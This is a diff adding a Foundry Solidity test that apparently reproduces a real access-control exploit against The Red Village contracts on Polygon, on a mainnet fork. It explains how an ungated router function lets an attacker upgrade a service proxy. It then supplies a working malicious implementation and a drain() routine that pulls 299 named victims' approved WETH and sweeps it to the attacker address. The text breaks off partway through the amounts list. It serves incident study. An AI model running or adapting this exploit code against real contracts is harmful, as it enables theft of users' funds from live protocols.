@@ -1,0 +1,758 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+// The Red Village (TRV) - access-control exploit on Polygon, Sep 21 2026. ~31.43 WETH (~$80.7K).
+//
+// The TRV backend is a registry-of-services system. A central PolygonTRVRouter resolves a named
+// service to its proxy address and forwards a caller-supplied calldata payload to it. The router
+// itself holds the _authorizeUpgrade role on the service proxies, and the service proxies hold the
+// token-moving roles on TRVZooKeeper, the vault that custodies player WETH via standing approvals.
+//
+// Because PolygonTRVRouter.forwardRequest(serviceName, serviceId, data) has no caller gate, anyone
+// can make the router call any registered service with any payload. The attacker used it to call
+// SeasonService.upgradeTo(maliciousImpl): the UUPS proxy sees the ROUTER as msg.sender, the router
+// holds _authorizeUpgrade, so the upgrade is authorized. The attacker's implementation then calls
+// TRVZooKeeper.transferERC20In to pull every player's approved WETH into the vault and
+// transferERC20Out to sweep the vault's full WETH balance to the attacker EOA.
+//
+// Exploit (two txs ~13 min apart):
+//   Setup/upgrade tx : 0xac0666c534dcad575cdb1fbcbe5b74e8bba418e35f4273933f62167d5143d55d (block 94200341)
+//   Drain tx         : 0x3730141adea0cd5a64824c0a541c4405256b4054ac54d8c1de65fe6ba210dd35 (block 94200868)
+//   Attacker EOA     : 0xa566592cb94475baf5b46ce373a260dfc9d0df3f
+//
+// Victim contracts (all unverified-UI but behavior confirmed live on fork via the traces):
+//   PolygonTRVRouter (proxy)   : 0xc97dcb0492412bfbbf47332f1b1b49e177e8f15c
+//   SeasonService (UUPS proxy) : 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77  (found in the upgrade trace)
+//   TRVZooKeeper (WETH vault)  : 0x426d27190a2ddb87f1c6235f710e159a0a3774d4
+//   AccessControl              : 0x3f0B50B7A270de536D5De35C11C2613284C4304e
+//   MaticWETH                  : 0x7ceb23fd6bc0add59e62ac25578270cff1b9f619
+//
+// Root cause, each confirmed on-fork (hasRole queries + the upgrade trace), not assumed:
+//   1. forwardRequest is PUBLIC with no caller gate. In the setup trace an attacker-deployed
+//      contract (no privilege) calls it and it forwards straight through; the only role check in
+//      the path is inside the proxy's upgradeTo, and it checks the ROUTER's role, not the caller's.
+//   2. hasRole(router 0xc97d..., SeasonService 0xb172..., "_authorizeUpgrade") == true. So when the
+//      router relays upgradeTo, the UUPS _authorizeUpgrade check passes.
+//   3. hasRole(SeasonService 0xb172..., ZooKeeper 0x426d..., "transferERC20In")  == true
+//      hasRole(SeasonService 0xb172..., ZooKeeper 0x426d..., "transferERC20Out") == true. So code
+//      running as the SeasonService proxy can move any player's WETH out of the vault.
+//
+// The attacker is a plain EOA. There is no admin key, no stolen signer, no multisig - the upgrade
+// authority is SEIZED through the ungated forwardRequest, not legitimately held.
+//
+// This PoC does NOT replay the attacker's implementation bytecode. It deploys its own minimal
+// implementation (MaliciousSeasonImpl) that preserves the UUPS proxiableUUID slot and exposes a
+// drain() entrypoint, and upgrades the real SeasonService proxy to it through the real
+// forwardRequest -> upgradeTo path. Real victim functions, own payload.
+//
+// Amounts: the 299 player pulls sum to 31.350379502001367982 WETH. TRVZooKeeper also held a
+// pre-existing 0.075638972516 WETH, so transferERC20Out sweeps the full vault balance of
+// 31.426018474517367982 WETH to the attacker - this is the figure that rounds to the reported
+// ~31.43 WETH, and the figure this PoC asserts. Forked at block 94200340 (one block before setup),
+// so the upgrade and the drain both reconstruct on-fork from inherited approval state.
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+}
+
+interface IRouter {
+    function forwardRequest(string calldata serviceName, string calldata serviceId, bytes calldata data) external;
+}
+
+interface IZooKeeper {
+    function transferERC20In(address token, address from, uint256 amount) external;
+    function transferERC20Out(address token, address to, uint256 amount) external;
+}
+
+interface ISeasonDrain {
+    function drain(
+        address token,
+        address zooKeeper,
+        address recipient,
+        address[] calldata players,
+        uint256[] calldata amounts
+    ) external;
+}
+
+// Minimal UUPS-compatible implementation. proxiableUUID returns the standard ERC1967 implementation
+// slot so the real proxy's upgradeTo rollback check accepts it. drain() runs in the proxy's context
+// (delegatecall), so external calls to the ZooKeeper carry msg.sender == SeasonService proxy, which
+// is exactly the address granted the transferERC20In/Out roles.
+contract MaliciousSeasonImpl {
+    function proxiableUUID() external pure returns (bytes32) {
+        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    }
+
+    function drain(
+        address token,
+        address zooKeeper,
+        address recipient,
+        address[] calldata players,
+        uint256[] calldata amounts
+    ) external {
+        for (uint256 i = 0; i < players.length; i++) {
+            IZooKeeper(zooKeeper).transferERC20In(token, players[i], amounts[i]);
+        }
+        IZooKeeper(zooKeeper).transferERC20Out(token, recipient, IERC20(token).balanceOf(zooKeeper));
+    }
+}
+
+contract TheRedVillageExp is Test {
+    IRouter internal constant ROUTER = IRouter(0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C);
+    address internal constant SEASON_SERVICE = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
+    address internal constant ZOOKEEPER = 0x426d27190A2DdB87f1C6235F710e159a0A3774D4;
+    IERC20 internal constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
+    address internal constant ATTACKER = 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F;
+
+    function setUp() public {
+        // Fork one block before the setup/upgrade tx so both the upgrade and the drain reconstruct
+        // from inherited on-chain state (service registry, roles, and the 299 player approvals).
+        vm.createSelectFork("https://polygon.drpc.org", 94200340);
+    }
+
+    function testExploit() public {
+        address[] memory players = _players();
+        uint256[] memory amounts = _amounts();
+        assertEq(players.length, 299, "player count");
+        assertEq(amounts.length, 299, "amount count");
+
+        uint256 attackerBefore = WETH.balanceOf(ATTACKER);
+
+        // Deploy own minimal malicious implementation.
+        MaliciousSeasonImpl impl = new MaliciousSeasonImpl();
+
+        vm.startPrank(ATTACKER, ATTACKER);
+
+        // 1) Seize upgrade authority: ungated forwardRequest relays upgradeTo(impl) to the proxy,
+        //    which the proxy authorizes because the ROUTER holds _authorizeUpgrade.
+        ROUTER.forwardRequest("Season", "SeasonService", abi.encodeWithSignature("upgradeTo(address)", address(impl)));
+
+        // 2) Drain: proxy now runs our impl; it pulls every player's WETH into the ZooKeeper and
+        //    sweeps the vault's full balance to the attacker.
+        ISeasonDrain(SEASON_SERVICE).drain(address(WETH), ZOOKEEPER, ATTACKER, players, amounts);
+
+        vm.stopPrank();
+
+        uint256 gained = WETH.balanceOf(ATTACKER) - attackerBefore;
+        emit log_named_decimal_uint("Attacker WETH gained", gained, 18);
+
+        // Full vault balance swept: 299 player pulls (31.350379502001367982) + pre-existing vault
+        // balance (0.075638972516) = 31.426018474517367982 WETH, the on-chain drained amount.
+        assertApproxEqAbs(gained, 31426018474517367982, 1e15, "attacker WETH delta != drained vault balance");
+    }
+
+    function _players() internal pure returns (address[] memory p) {
+        p = new address[](299);
+        address[299] memory a = [
+        0x9F11486f80982663575D606afC28182a76E46a07,
+        0x86f3b705B32411b8bf0F839E12FCdfD0125B51c2,
+        0x4523634a87414e6975C4b33079396747C3727592,
+        0x9dA9ED40BfA71F98A90151f0b1272fe293a75EBB,
+        0x821d9A3F2Ea71E19c862218f4B041FA5a2827490,
+        0xA54181E56573d74e7f5278E7bA7dbFFC74DD5fde,
+        0xdf7280652f75f434358F87308bF57874af45E60f,
+        0xE41c8c15cB91BA2F195c2A871343286CB3D83653,
+        0xc42568154fD372bEa66e9F8fD246dd1f90C7C1bC,
+        0xA0e9CB07d36953f3a2065BCDEF7Fb1a6F43D8852,
+        0x709Ae03d009A6A7D876cbc0D40A550B004447605,
+        0xd785cF6c190FfCEc082CC91A40E9FDEc7391847c,
+        0x027A8f16349C81C98A1b6F9017C360E782E1bE13,
+        0x6d3CcE709258BbB7930b7138d3C83Bf1ed531E0C,
+        0x8BF840938E4183A18C0D2F138Ddbe76d5DaFA362,
+        0xD77844791F3D81Db1F903C02Ebe92F1B84d610fF,
+        0x98d4566cd625B0d251a29064fF3c9E518db08aEA,
+        0x1F037583B48Bf2Eb47D9829AFE3e26E00D44f0df,
+        0xea688c5c5C91045ee9117d79B6A30445FfBEA3D0,
+        0xB51682Da99BED7A6899BbaD21BD7146Bf44b6F5d,
+        0x1166a98e3Fa9FBcD4126780EB33857791B3534D6,
+        0xE82AA5Ea024FA592E3d47999493E49D2e7155C7c,
+        0x806a6A43F70762553d4f3AA3E07B90c396142bB8,
+        0xD554dE6987BF242E92A73789058c3C5594619a16,
+        0x82699ce2D123F18573C55520585FaEbd28ef2F34,
+        0x08DAc8965701E67fE4B9Cc77AbE2568bA69d29Ab,
+        0xDe8028342bb62811B05e88722B71EE28A8b1b907,
+        0x1c8CdC1985f2Dfd3B1F0Fec5F679DF63B2e421f1,
+        0x683425351Ae25B10f463Ab9aBC10c2f5602faa66,
+        0xdE77A17E0F655feE9F1d019b2B94bbCDDAe63654,
+        0xF0d42c2F1dab38906B3A70Bd050293Fb10aC603a,
+        0x0f33Cd43FffB2280c34368515023EdECb54cFF95,
+        0x2F543396E6165241b0045F725006D254f7015cc5,
+        0xD87d8581450215a7Bc4cd3Fe0baaeD32d3E6aAc5,
+        0x3Cb3057eD534e91882a41EC4914e373fa39cE984,
+        0x298916FeB8B9873Eeb56d22a536e732359807046,
+        0x82a1D9ff7B66A912f268C5758f125886E9d0aF72,
+        0xDA0B01f417F55AB142975C2379E277ed7ba77606,
+        0xa2Be7F6c34746b2ABBB7bd19f2f31440c7C45459,
+        0x99686aB73a12714E330ac98F20e3923264f1b8E5,
+        0x67E7adB6d6a780e9b15C20c1788549A83Dcf67c6,
+        0xf14F1281B89a476465b9467e7f1aaCd7e96bb17a,
+        0xD93d50308f5B43d6310Af0F888a796328164C81b,
+        0x77Bab4Ac4384B316813C0CF6Ae9C51c235c900B3,
+        0xe9BBcEA9c74C33bc86aaBdF8dF18aFff38af5ae9,
+        0x4E8C1CfD32C026e2561cEF1F0BC60A948805a330,
+        0x6f50c9DB79a017544E2d45bc2ec54A8A96B656a6,
+        0x13305768f9Cb29773f907B0ce7b352A7bF1B1F5b,
+        0x237878f7DE21e5911524bdEe91e8D1eddD997b08,
+        0x68b717eF9C625814b05213429075d266fB394e14,
+        0x55C2F67F998Bdb18957Bd449190A28230409f1A2,
+        0xB9669d58F5128735311C89A825a6F8998227d122,
+        0x351E5745c99a4b8Ec8C0c204de1faa917A6c2DC0,
+        0x3648B018998e3073F5D9e05446F4B432f56259a3,
+        0x6B1235F0b48205e088A7Fe1E5AAA5a8048AF736F,
+        0xc436f42d9F05cef2F13cbAdb34E3f90768eCf8d7,
+        0x1adAa43A88Adb4ABf25621CA18f35B3F9a602Ab0,
+        0x8496fd437B3CDc30318a96E57c5C335F8844234C,
+        0xA72E028995d79cd3E9fbeb9D8FE9589b9090b41B,
+        0x45750b33e5aD830b74950064D847DfA1bDbd6B89,
+        0xCd2f19bB4CC27F6FB239BA34d0830C87e816B275,
+        0x8dDb29bE64676777B112Debe38129DD660e92b31,
+        0xa358C41c6311c695225eA626186cF00afA1f572b,
+        0x71Fe2e63a112479b65D964Eb2a5F5Cd035029Ee8,
+        0x85e1eE46f7f15BB8Cc2d6739e7de64bCF0aa11B8,
+        0x5275cA82Ad3C6DA93fddc80FAAD8D2711014e775,
+        0xD44F9dB7C700aecC2b735ED2b2EB9463F8a494e4,
+        0xFf634F9ED1005198F3Ae614328d2274c97e97B56,
+        0xFA13A3c6Cf759E00f726991eB6DfE4E5E3a09d6F,
+        0x9c5028DC48C32e3F528B2f7f9336Db554F406f8F,
+        0xf303a9f82213778A8c199190E98AD6b755C6fD8b,
+        0xc2cf9209Ea49C637c4e58266a99F38105EBa2a49,
+        0x563dd5a22604933eCcb43116EA13E7C0a269C486,
+        0xe7e259D24dA40dD552ea73fcB7AfA037c8aB99d8,
+        0x23C988CA97d1898b308FB19D07c3B2774c696D59,
+        0x1BCe7CeaE1DC12b8E9244884da15E10038C7707c,
+        0xD491EDd69A05b0976f4e31fFDE9cc82bCF4323b6,
+        0x6F70c3Fb8d3Ce5A6Edb3a31F4d9d2A4f23D82F97,
+        0xC53B10cc6AF73d33dCD76B56acC4dD595157b54a,
+        0x6D8b31d9FA33Bb704eBCF26a1435dED8F6dBb2C5,
+        0xfBBA2a17D5496CB723997C5f96CD623de2EFC7D5,
+        0x7aF2f267883a61cF633ee9e5faAfb08733B21CD7,
+        0xD9AC5C44EF56DDd0D99da81b732793609C4b8F79,
+        0x4FDBD31E78615493B7ec5Fc20fC75d0A649FDE2E,
+        0x175548eDcB989595C92eb53CCb8b8FbCEf79e4f3,
+        0xC0Ebb625eA6aDd91F990472604aA9Ed5774402E2,
+        0x5Fec3B40af6EE593e2A4a77d78374C1c8e787019,
+        0xD00c886b68367C3594F88E9BDbaA37c301470776,
+        0xAe972aF0152BebD8d66F56BfDC6B37E286130AF0,
+        0xEd0681B6C0ff0F71edF37897Cbb89B2273C6d416,
+        0x78E6137F2F68C41720784fAE2eb74CD5B7970F36,
+        0x397668e94EcD369449361F53F7d6aA342D138c13,
+        0x52E60f5E3E0F93bf438Ec9427E22222Acc18FA2F,
+        0x27476E8b45aDabd5730A497ea82bb8758cc87cC7,
+        0xd582E784c71761c8BCFD12057fEfF194616Fe9A5,
+        0x896EFB6d8255C5D9380a5B4D095bc80C9CdC8Db5,
+        0x7052Cbac8F1ca4ADBB72de083Cc7F999bd33A8E5,
+        0x430a8629E40F76Cb2aD51Ecdb5E3BACCe814717d,
+        0x5cdBb6d4E295789C9b08DfaB82Fc9814d51fC451,
+        0x24bd872E11E48a2D5430506C845261d4FB1A860f,
+        0x89d3EA225C3447057a0c165D1225427A323B585E,
+        0xE553142386e999606aD14DBa6cE17F4E56eB80B1,
+        0x6543816fc815217E47D4166E9C8ad28a4b1da219,
+        0x2c3474Bfe64cD9748be69D24c30cC91639265e68,
+        0x7808f01C942655C995B9823D7e739D251532038a,
+        0x60289e8874aaDbAe7a6aCdD67d83F7B5964aFb58,
+        0x6e4F3A3cC692d3c126C2e676B17224A1A0f22e01,
+        0x9880BbC73403DC74A6460b84DD16e4f04910A696,
+        0x6A9F317eF3eDBF19478E8e3024A4b7Cb0E7a7774,
+        0x6262a35bBe62B7c380cF6a65AEB8c5f901142B47,
+        0xd03Ada47DD63E8fC4487183f3F69DD3Fe99C95B7,
+        0x570e1B11b1560a7d62aE193C46e6D57b621Ad5E4,
+        0x45Bf9B3B2B0DFCB5b9864a6Dd1c6b5C9b0cb5aA4,
+        0x0CEf55898eE8F247845DE679DA591Fd33a3b4C0f,
+        0xE95FEe9905D3CC39098cf5F4238cb2776967889F,
+        0x4d05151F9DDe286F3174a0649E078E356e625e2c,
+        0xB16E64713cc7EFD6C38e56C66bcBAc24A13BA0c4,
+        0x181A99CeF678CDf2CfD855fCdAb1230bB7E9616E,
+        0xeb349bee62002EeA2f6511FcEbB75EcE187A3d8F,
+        0x7270088c2ee2e40a52A990458B34361bEfdBC902,
+        0x87d26179e5518A4503984f55794Fe4Af25A6519c,
+        0x9bC04a5D7985bFDdD40b824A1B5d865DF013fF28,
+        0xDc4Ca796468771f5a341c999742b7a6211e7BDAf,
+        0xb66881F4243a3BfF509D990b0F81f6f534E766B1,
+        0x6A6048f18223D2486f997eee6B134d23b076FE6c,
+        0x80F22ABd952D99D1aB4658b0628f575bA6b8EDAf,
+        0x86e89df3F629F733848019D3E356317159b9e9c8,
+        0x4b55eF5752517014DE48006AcEe30C976b6E6d50,
+        0x4B233E72f759ea04A07f7B8e4Acb2BD547779336,
+        0xC4353D75a7c2c1485787e5875760109c62ad22F5,
+        0x071DE7C7a3394dD34329916500eAD163e99F04af,
+        0x31eaB4Afa73657e0eC5a4c731401a70F18D743C2,
+        0xD809f431058826999B2b8A30eF328ADB3B172c3f,
+        0x2113C963f1784B17d10d4A9d7b1fce3DCEa2F09f,
+        0xBaD0511DB247729305b90f4A242d8b25B8cA33ec,
+        0x9C6fa853aA9f34a7424238c18b794A0646A4D0AF,
+        0x0B40d73655CE034be80d4D0c81b01F16860F16B2,
+        0xB5164EbccB7800CE5d00922E609eB3E20717e0e4,
+        0x204516B5944E11FEB77e1C3c26B3f4eFFf8D147A,
+        0xe1Cc9fCa908aAAC30616826D5a320e5Bc5C9223b,
+        0xf3A2591508Da7dAe55dd21664ecC6850053c0CD9,
+        0x5132ed842A01B4E28AeF8F6df0Df85762b9d2B8C,
+        0x11354919F8C6F51F1165085dbA08Ff99159412e5,
+        0x1FDa51a1683a6D4bf12f74048581851f4412d9d9,
+        0x104dcE4800234c7780bfa06884B821c7037C9984,
+        0xef4D66cF5df9C14b4B0440158B81cab407f30321,
+        0xcfb8D8ebd1c4dd1D8baaa8C0E1a95E6864B05B4f,
+        0xe1b7B1ed02EE1D42fe07eA854b7CcA6F485A9A83,
+        0xC4b07bab14df8e5053b3D59e58661D13fd73c7f0,
+        0xaf545F8eBaBB7215395298868C396bC6bfce6f4D,
+        0xE7c29d8426a0C70449396E2DB94A7C3C5833F9B9,
+        0x699c9743edD795BCe8A8DFB0dc00fcA6d110F574,
+        0xf0E929c7F1a9f4aD11D6255ae44FC4Bfc2CF973E,
+        0x8A524c49A33580300e451488B4F4265f94db8299,
+        0xfbF862D62b28C425e29c38091308cDD298424cb4,
+        0xf087a6923c27919A5A47A4978002E9bC30bB5007,
+        0xFceF10FFD4a0Db70E4fCCCD353D3de3FEe568F47,
+        0xd7F0a106F8d065C48a5429FDEcDc5E69b793f655,
+        0xe38E5222d5715D77aCA0ba93B7af3c9a909FFECF,
+        0xCF66ab57087f7A9194305251336A8be5deF7C529,
+        0x122Ca73C06D3bd1B3b2aF465123876b5c8308D61,
+        0xe091f8eE24dfeA7881588F0D34Fc1495678b7bC6,
+        0x19C6a30e672097Ee8FDD2f68FFC0915fFCE9DEd6,
+        0xd9E84E6266ED7CFc82842c49224860e7b7776c60,
+        0xB56F684fCDB8302042F3206e3cbaDE8916FE7b17,
+        0x98b69D0B81fb1966eBe0Af76789425706e5aFe7B,
+        0x057925c07c7360FB0F9e6c1cF90E307b50C31493,
+        0xCd335438C0D26f10cB2F7164825013dB2e372642,
+        0xbb83b599Bc0dcd55F823e03B35d31EfF8FfF1D5b,
+        0x5d949a4E83d3252D98215DCA12A8f7B217403C23,
+        0x166FBe095EE91924cf7FFFEeA1cBc75DC263e581,
+        0x741c8e492e4b447f95653DC7fECD1ddcFaeb9416,
+        0xD9287A7A8b5B0C863f75EF9Fbb7cA6b8d9DaC3BF,
+        0x2b23E4E377f2494955089040c1d56A116cF55956,
+        0xe4933D4c05e1EE7BdaC4d826Ea703DAa156ecab4,
+        0x45184Fa03E2cd635DCC5EeA5c2D62E4853092073,
+        0xEb3E9F7810C9845fCeF252DbD9997B88dD3cF4Ba,
+        0x718E2cA0A522f1ae2676063d652453F316b79aa7,
+        0x5D2F89cf08550fc466cc3F56aA67d927B9c9e30C,
+        0xB92834027121a44cE9C6D55509f382e3865aB82E,
+        0x5f5F191a559dD793D91d85c21923b1a504A3e69d,
+        0x968366e9BDe932F830cA539Caf0eaD0da7413fa1,
+        0xE4f1CeE47Ac56f9134A24AcE3E121AcE964eCAf7,
+        0xcB8B375Ea2AB6Ad7F670218943e53232480AF52b,
+        0x385d1642164d9794D4C42c01878cF44FF6bdB0F9,
+        0xAb8D2F6Dbfe216EBa1f9834F5B50732d09C93045,
+        0x73E09C588F61C6476a0623Fc8808CBa794d97006,
+        0x6b9625732846ea2764a45c690f23CA6F687b37E6,
+        0xac120F5111c5e0f5DA52a8a7F46F37837Cf8160b,
+        0xD8C20CEb6cE8D2D58c8fB899D6C636Ea49226d61,
+        0xFb7486d7f45D5A7C83b9Ec856Ff2D33C13aefd26,
+        0x9bAc1E17c6D30eB8d75472cE1136AEde39dbc1C3,
+        0x259CB30a31e3EA9b03bb81585cA6Bae334DcB93C,
+        0x8924ac1196E2ae89603925B6e001Dd14E3f7fDFf,
+        0x2610c5d1e9C6FaAAC39B08964ab90B7495F48eE5,
+        0x1eA0BBd9cD933301E22D5b2EeC86363a3d353cd8,
+        0x4fFe2f340563F4f4551c10Cbf34724aaF2DeE861,
+        0x2C422C83f7229AE1cc3c42F9a014914D43a80fB2,
+        0x18acbA91Dc2761dA6D848D01861e0E139815a9b0,
+        0x5d70E72ebc30Aa69b71982Fe82f8603F71B6637D,
+        0x56D0665F0438946E6EF1a127082321e6A96B04b1,
+        0xB28D73F54Cb1d450BBE95aba9A37D93Bd577f993,
+        0x817aD500886a3F7837C89ac24D178AF3Ffd49C0D,
+        0x12372b0ee93caFe88D00ec53da94CA73B5FD767e,
+        0x9a0E3D58b77ac638e22891663B24776a0E75d462,
+        0x79F7bDDf1ce0dBaF402C3098FF1E5613EB8Ab627,
+        0xe2d0fcEE2C6b71A1d78D191485ACA0E57C8cF447,
+        0xdf583db8383CED63B6Ff1f2e2f0c8b93c511bcbB,
+        0x671E1Ebee781dd814e08E964F9a0BEdF5E868E06,
+        0x9ab44e8DD385f42CDD3F92830019ba90003848f6,
+        0x001B8e2cAF132ffED79dB92ff192d20b44325411,
+        0xF820526d4e5F79d4C7247f0e8d09d3CF03695Ab4,
+        0x6a3DbF61C5640365641FC338B34BdDD6DD0d355B,
+        0x3780cD8623268e850E1B0A314B77f8804A951085,
+        0x1F09FA11165CFb91A61D69a1f89c17bE9Ebb51e9,
+        0xD380917495eFAEdC1DB44e1414Db3ae07D157158,
+        0x67cE5A25502C558a7B8ab19E23ae0A5B3385b737,
+        0xdB826BeEfa12A13591aefa2EDFab313E6A342698,
+        0xaf031Ae4BF004eeB85B7504133D886b944666189,
+        0xeb39C9D420B859c335a8b8458d0693B3C8CB58f2,
+        0x6B4f4A6461e4fEed9505AA77F571bE74057f61Cd,
+        0xa3DE3E022452b3e71eF93DcA648928bC38e9AF13,
+        0xf2d2375DE7a07079B25d3f209746aF3CB112978D,
+        0xb0494407B3475E764cEF9dFF9D68AAfCf1516FF7,
+        0x9792553d10cFb1f425E593cC68D5766FA1c0f150,
+        0x519CCD4cfB7bb1f26830d7885Fe2b2918E3c95Ee,
+        0x850B651Bd1Daa2a60437dca5863b339D15A6564D,
+        0x866F60C1E824F980aaA28c5ccbfa8231F379B21D,
+        0xA1E998c23A73c489BF3AfA73fA9a575f2b6e774D,
+        0x1fEb7f8dBaF16DDB811C778B0FC255646A44381F,
+        0xa819C50d511187CE0f6Aa352427586D6d0c187F7,
+        0x7DC20C59904c3bA1a0994E995B3D885763215671,
+        0x5dCB10fAF618A3cf0a7B6bb1bFa0494451089De2,
+        0x315b2077cbCb50e59f36322ad719eCd89ABFd57C,
+        0x84C8f7c715787EFd34038CC0593c1b602fc900A5,
+        0xf24aff1dDc6D3481c318b4b321D91791823E44E7,
+        0xEE5eD4420CD449394D6914d7988dfeb704925D68,
+        0x2707363fE51E6DCCF5A173066207FFecD99E439B,
+        0x73786Ca4404653cA84cD6CC01AEcF91187A9b9dE,
+        0x89B4e514559E0Fba358eD36869ACb01e1F8b5Cb5,
+        0x4951065914c9AE84646A6b7c85AeD3948bbf6599,
+        0xCf2c80b3C7C09EF9FF791bB56776287ff8D3B600,
+        0xa3cE9b4EA5E8e3d3BBfc6E5649D3b8Da1f812542,
+        0x5aE4DBa65867CA5310E2E887316375901552474D,
+        0xC65328a9e842f22643332733a479fd63f179Ab4d,
+        0x2994cF5fA51Fb5Df3f0d2F7C091D5d938fD36799,
+        0xFF37CB274E6C7eEBc8d95ae266A782E87AbF5cb4,
+        0x464eA8d3f512E09f76b98Db5A0685b4eEe10cc0B,
+        0xE5E7fCb603b03F3De5e0a0aA32277D8bd3188Fb8,
+        0x7b28b60A40C240c831158A0D644A1Dda34150b61,
+        0xa9f7675C9732D8F18182841431A72EE3F1a3D26d,
+        0xEa264043DF2932F9B1B554713d7262975109F2B2,
+        0xDd6BB69c3263aF8aaFD817c27e460d37ABd65fF0,
+        0x92Ea4A2753290782927E4Bff69505a34a5B28166,
+        0x32a911FdD6f882927fc4a3Dc86fcf8D6D8BE67D1,
+        0x8ACd9Cc99d622FDE692F0f6eBB6C840C41D7DF08,
+        0x6081Fd3778617FEdFA596f7c8F8D6577BCB9cCd9,
+        0xa49fAc104AA54243d9814087227F5b254cfA6959,
+        0xDdCe0bc2D2f1C1985b5ecc154180C5b57D12B0f8,
+        0x10baF8298D4774F91C527DD963b7a18d60524c15,
+        0x2109652A0B2F16295d628F7BA108CA19e3bce112,
+        0xa837c1E2b87aab4d28FeE399C6593B66422fd5d2,
+        0xD1CD5ae50b4ad44d43aF40b037C8CCf3f0EF7c96,
+        0x58E0551c0d175Eedbf86AF8a9b8cE89714F73a20,
+        0x32e5D9245bB56F428a13E2DE9A47453C9f391254,
+        0x50d336a2C6Ab0a5bdB62838Cf5d51c9A556Aee43,
+        0xCe28b3E38C6d633436eDee285c1E13771A865B2D,
+        0x6e6561f85DCc43c8dc717Be06b4000B06D8c7DcB,
+        0x5181091013a54aAc14453e514d0B7BDb70629280,
+        0x8f30Cb8c6d7D52A6b312Ba31578B3E60fee876BA,
+        0x63e760FFe6ee3FBBe83ee53A3EeA554371537C5A,
+        0x6F1124F5DfE0462287860cd8B2b592915eEa91f8,
+        0x1a34e4632a6541fB2048A1D9c17939Eb2F377354,
+        0x5423A49D6eae4d047CBCf7a5489b82Ac2e3f8327,
+        0x3bD7e4A7c70CC11DA0E892efd19081c9D3dFBfcb,
+        0x929dC783b613E6ccd80BA4a4FFD3289cfF82866A,
+        0xE58D1afe29D4ef5b792956CAda6043b41995d39f,
+        0x4b8ee1eEf0bD930c2277a60c839834B142B373d2,
+        0x6E4DcBa392CEfCc3B021a96D088F4Be773AAfB9b,
+        0x6d14eCd12663E1114eC3534d374ED598509DF199,
+        0x00a3556C1Dd57c24714385B6687403ae9Ba1A876,
+        0xF35ACaf05e8cacFf748a4fd2127786EAbf60f24F,
+        0x9Cb81A6d8F1434149c4368588a23059CE092dc04,
+        0x4193058a0d40FD044D9b0F25e5A240E7679B70B9,
+        0xF512615ef652D714BDfa78999BdeC9084a672256,
+        0x82DDEedc3fED36b418A4a49E1F1f7cB87429269b,
+        0xb9B31908f6a09A029E77b8791590E224B496E14C,
+        0x4C53153B49074C4946b44Cf2F27795B70453a52c,
+        0xa55598Bd2dB382B8C01bFAA34279bF903382B56a,
+        0xa3ea9b33Ce9f0F3789F24A6D7Ae131c66D1c1656,
+        0x89FE8951f266ed17568701a20c799Bfc49027476,
+        0xC1Fa3a7e799f086d1026a05facE4346C654e1117,
+        0xf43C9c9fc5829A397Fe2D3908213388F7f6be9Ff,
+        0xCc4eE15F8E2cF21768802b35156E9F14070183C9,
+        0xBfd37dff2A55Eafa58B3d33aaA4fE008d37fA3c5,
+        0x8Beb91Ac2B0bA5D1459F7BeE13dC67a9708C645F,
+        0x828C6d7051f0a1d91C3e5d3fC995E0f81b5856Ec,
+        0x6C71348bb9573146634809de7CCa73cDfcc5301c,
+        0x31c71ffD86578379037bd1906257aF13231a4a2c
+        ];
+        for (uint256 i = 0; i < 299; i++) p[i] = a[i];
+    }
+
+    function _amounts() internal pure returns (uint256[] memory m) {
+        m = new uint256[](299);
+        uint256[299] memory a = [
+        uint256(9973624500000000000),
+        5646407105892860026,
+        3559868015987932559,
+        995302774875814611,
+        883277064922616948,
+        591351335400000000,
+        500412303163856409,
+        457288113558357988,
+        437998613834197167,
+        415842766951572535,
+        361091170531662779,
+        336032324099250000,
+        334093432566798823,
+        314501393311573933,
+        308989945134057996,
+        306486905364301252,
+        258914160290400000,
+        251550756860000000,
+        236300000000000000,
+        224079747267558941,
+        204871401954850000,
+        201108018000000000,
+        197849863384249989,
+        180027540286695403,
+        161922746100000000,
+        152597202310229244,
+        144737719660309532,
+        135135500000000000,
+        131571878781847954,
+        123688458207320968,
+        122090880000000000,
+        116888764746906770,
+        116849465320485071,
+        104880185730765741,
+        101000000000000000,
+        97632583223295705,
+        97500000000000000,
+        96780119200000000,
+        86343804279252142,
+        83018540329245982,
+        82368356587296814,
+        77034385083949215,
+        75472000000000000,
+        74912284893436582,
+        72081329491600000,
+        67044675697768447,
+        66685331972676432,
+        65895733204366895,
+        59699975652052692,
+        55155370254103429,
+        52129843050216484,
+        51050718890853542,
+        50460680885544541,
+        50453628098313690,
+        47757289035626437,
+        47718500874100465,
+        44657784363447454,
+        43280000000000000,
+        38356800000000000,
+        38129883199092421,
+        37135647327206666,
+        35055000000000000,
+        33509060900000000,
+        32709130920000000,
+        31685341755468788,
+        30639224663841534,
+        29500000000000000,
+        29381912851533401,
+        29331961177765002,
+        28553512502963755,
+        27837228254775816,
+        27751539863316973,
+        26072881669758312,
+        25630000000000000,
+        22119697500000000,
+        21632813520036409,
+        20826184620556781,
+        20080452757119406,
+        19801370046130121,
+        19599390264850667,
+        17900000000000000,
+        17014250225428872,
+        16951073580224177,
+        16501117163559226,
+        16108000000000000,
+        16030585963431858,
+        16002948370879539,
+        15357200000000000,
+        14085497847370016,
+        13867971111334442,
+        13569512717075528,
+        13323791839100000,
+        13205638973807465,
+        13109623310371357,
+        12540000000000000,
+        12280653768126952,
+        12143400000000000,
+        12111417330867813,
+        11750000000000000,
+        11650623002618007,
+        11625497679265254,
+        11283162052178571,
+        11227430000000001,
+        10321028275682725,
+        10314538958079560,
+        10304100000000000,
+        9588447200915714,
+        9249584221186160,
+        9187613741075678,
+        8808461211419685,
+        8561492830191025,
+        8416520546003670,
+        7532467550000000,
+        7326354654571098,
+        7118000000000000,
+        7002529814555654,
+        6587213489561463,
+        6510000000000000,
+        6435391553069296,
+        5914552929314604,
+        5900000000000000,
+        5849600000000000,
+        5600736000000000,
+        5368408407916756,
+        5344149883706505,
+        4841358488205021,
